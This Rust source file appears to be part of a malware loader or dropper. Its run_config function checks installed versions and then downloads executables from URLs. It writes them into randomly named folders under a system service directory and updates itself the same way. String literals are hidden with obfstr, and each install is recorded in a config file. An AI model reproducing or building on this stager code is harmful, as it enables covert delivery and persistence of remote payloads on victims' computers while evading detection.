use std::{ fs, io::Write };
use obfstr::obfstr as s;
use loader_vars::{
    constants::{ loader_version, system_service_directory },
    types::receive::{ FileSource, RunConfigParams },
};
use anyhow::Result;
use shared::{
    constants::{ client_exe_name, system_loader_exe_name },
    network::basic::download_bytes_from_url,
    utils::{
        config::{ load_mib_config, write_mib_config, HostConfig },
        functions::generate_random_string,
    },
};

pub fn run_config(params: RunConfigParams) -> Result<()> {
    if !params.enabled {
        return Ok(());
    }

    let mib_config = load_mib_config(true);

    let mut highest_installed_client_version = 0;
    for client in mib_config.clients {
        if client.version > highest_installed_client_version {
            highest_installed_client_version = client.version;
        }
    }
    if params.client_version > highest_installed_client_version {
        if let Some(client_source) = params.client_source {
            let _ = install_client(client_source, params.client_version);
        }
    }

    let mut highest_installed_loader_version = loader_version();
    for loader in mib_config.loaders {
        if loader.version > highest_installed_loader_version {
            highest_installed_loader_version = loader.version;
        }
    }
    if params.update_enabled && params.self_version_latest > highest_installed_loader_version {
        if let Some(self_source) = params.self_source {
            let _ = install_self(self_source, params.self_version_latest);
        }
    }

    Ok(())
}
fn install_client(source: FileSource, version: u64) -> Result<()> {
    let bytes = match source {
        FileSource::Url(url) => download_bytes_from_url(&url).unwrap_or(Vec::new()),
        FileSource::Bytes(vec) => vec,
    };
    if bytes.is_empty() {
        return Err(anyhow::anyhow!(s!("install_client bytes.is_empty").to_owned()));
    }
    let client_dir = system_service_directory().join(generate_random_string(8));
    fs::create_dir_all(&client_dir)?;

    let config_path = client_dir.join(s!("cache.cfg"));

    let exe_path = client_dir.join(client_exe_name());

    fs::File::create(&config_path)?;

    let mut exe_file = fs::File::create(&exe_path)?;
    exe_file.write_all(&bytes)?;

    let mut mib_config = load_mib_config(true);

    mib_config.clients.push(HostConfig {
        version,
        folder_path: client_dir.to_str().unwrap().to_owned(),
        exe_path: exe_path.to_str().unwrap().to_owned(),
        config_path: config_path.to_str().unwrap().to_owned(),
    });

    write_mib_config(&mib_config);

    Ok(())
}

fn install_self(source: FileSource, version: u64) -> Result<()> {
    let bytes = match source {
        FileSource::Url(url) => download_bytes_from_url(&url).unwrap_or(Vec::new()),
        FileSource::Bytes(vec) => vec,
    };
    if bytes.is_empty() {
        return Err(anyhow::anyhow!(s!("install_self bytes.is_empty").to_owned()));
    }
    let loader_dir = system_service_directory().join(generate_random_string(8));
    fs::create_dir_all(&loader_dir)?;

    let config_path = loader_dir.join(s!("cache.cfg"));

    let exe_path = loader_dir.join(system_loader_exe_name());

    fs::File::create(&config_path)?;

    let mut exe_file = fs::File::create(&exe_path)?;
    exe_file.write_all(&bytes)?;

    let mut mib_config = load_mib_config(true);

    mib_config.loaders.push(HostConfig {
        version,
        folder_path: loader_dir.to_str().unwrap().to_owned(),
        exe_path: exe_path.to_str().unwrap().to_owned(),
        config_path: config_path.to_str().unwrap().to_owned(),
    });

    write_mib_config(&mib_config);

    Ok(())
}
